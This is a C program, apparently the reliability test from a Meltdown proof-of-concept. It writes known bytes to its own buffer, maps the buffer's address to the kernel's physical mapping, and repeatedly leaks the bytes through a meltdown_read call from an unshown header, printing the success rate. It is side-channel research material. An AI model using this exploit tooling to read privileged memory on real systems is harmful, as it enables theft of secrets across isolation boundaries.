#include "meltdown.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(int argc, char *argv[]) {
  size_t scratch[4096];
  meltdown_config_t config;
  size_t offset = DEFAULT_PHYSICAL_OFFSET;
  int progress = 0;
  unsigned char secret = 'X';

  if(argc == 2) {
    offset = strtoull(argv[1], NULL, 0);
    printf("\x1b[33;1m[+]\x1b[0m Setting physical offset to 0x%zx\n", offset);
  }
  
  meltdown_init();

  size_t var = (size_t)(scratch + 2048);
  *(char*)var = secret;

  size_t start = virtual_to_physical(var);
  if (!start) {
    printf("\x1b[31;1m[!]\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
    exit(1);
  }
  
  srand(time(NULL));

  size_t correct = 0, wrong = 0, failcounter = 0;
  size_t phys = physical_to_virtual(start);
  while (1) {
    *(volatile unsigned char*)var = secret;

    int res = meltdown_read(phys);
    if (res == secret) {
      correct++;
    } else if(res != 0) {
      wrong++;
    } else {
      failcounter++;
      if(failcounter < 1000) {
        continue;
      } else {
        failcounter = 0;
        wrong++;
      }
    }
    printf("\r\x1b[34;1m[%c]\x1b[0m Success rate: %.2f%% (read %zd values)    ", "/-\\|"[(progress++ / 100) % 4], (100.f * (double)correct) / (double)(correct + wrong), correct + wrong);
    fflush(stdout);
    secret = (rand() % 255) + 1;
  }

  // libkdump_cleanup();

  return 0;
}
